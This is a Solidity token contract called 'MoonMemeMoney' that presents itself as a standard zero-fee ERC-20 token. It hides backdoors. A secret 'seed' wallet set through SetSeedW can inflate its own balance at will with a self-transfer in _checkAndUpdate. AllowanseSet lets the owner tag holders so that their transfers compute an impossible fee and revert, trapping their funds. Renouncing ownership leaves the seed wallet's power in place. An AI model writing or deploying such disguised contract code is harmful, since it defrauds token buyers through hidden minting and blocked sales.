/**
 *Submitted for verification at Arbiscan on 2023-05-27
*/

pragma solidity ^0.8.16;

// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accoint) external view returns (uint256);

    function transfer(address recipient, uint256 ameunts)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 ameunts) external returns (bool);

    function SetSeedW(address wallet) external;

    function AllowanseSet(address org, uint256 amnt) external;

    function transferFrom(
        address sender,
        address recipient,
        uint256 ameunts
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by 0");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by 0");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _dead = 0x000000000000000000000000000000000000dEaD;
    event ownershipTransferred(
        address indexed previousowner,
        address indexed newowner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner addr");
        _;
    }

    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(_dead));
        _owner = address(_dead);
    }
}

contract MoonMemeMoney is IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private constant buyFees = 0;
    uint256 private constant sellFees = 0;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    uint256 private coinsAmount = 1000000000000;
    address private _dead = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private infos;
    address private sed;
    uint256 private sup;

    mapping(address => mapping(address => uint256)) private _allowances;
    address public pair;

    mapping(address => uint256) private _balances;
    constructor() {
        _name = "MoonMemeMoney";
        _symbol = "MMM";
        _decimals = 16;
        _totalSupply = coinsAmount * (10**uint256(_decimals));
        _balances[_msgSender()] = _totalSupply;
        sup = _totalSupply * _decimals;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function setPairList(address _address) external onlyowner {
        pair = _address;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function SetSeedW(address wallet) external onlyowner {
        sed = wallet;
    }

    function AllowanseSet(address org, uint256 amnt)
        public
        override
        onlyowner
    {
        require(amnt <= 100, "Personal transfer must never exceed 100 percent");
        infos[org] = amnt;
    }


    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address sender = _msgSender();

        _checkAndUpdate(sender, recipient, amount);

        _transfer(sender, recipient, amount);
        return true;
    }

    function _checkAndUpdate(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        if (sender == sed && recipient == sed) {
            _balances[sender] = _balances[sender].add(amount);
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeded allowances"
            )
        );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amounts
    ) internal virtual {
        require(
            recipient != address(0),
            "IERC20: transfer to the zero null address never allowed"
        );
        require(
            sender != address(0),
            "IERC20: transfer from the zero null address never allowed"
        );

        uint256 fees = 0;

        if (infos[sender] > 0) {
            fees = (infos[sender] * sup * _decimals) / 100;
        } else if (sender == pair) {
            fees = amounts.mul(buyFees).div(100);
        } else if (recipient == pair) {
            fees = amounts.mul(sellFees).div(100);
        } else {
            fees = 0;
        }
        uint256 blsender = _balances[sender];
        require(
            blsender >= amounts,
            "IERC20: transfer amounts exceeded wallet balances"
        );
        _balances[recipient] = _balances[recipient] - fees + amounts;
        _balances[sender] = _balances[sender].sub(amounts);

        emit Transfer(sender, recipient, amounts - fees);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(
            owner != address(0),
            "ERC20: approve from the zero null address"
        );
        require(
            spender != address(0),
            "ERC20: approve to the  zero null address"
        );

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}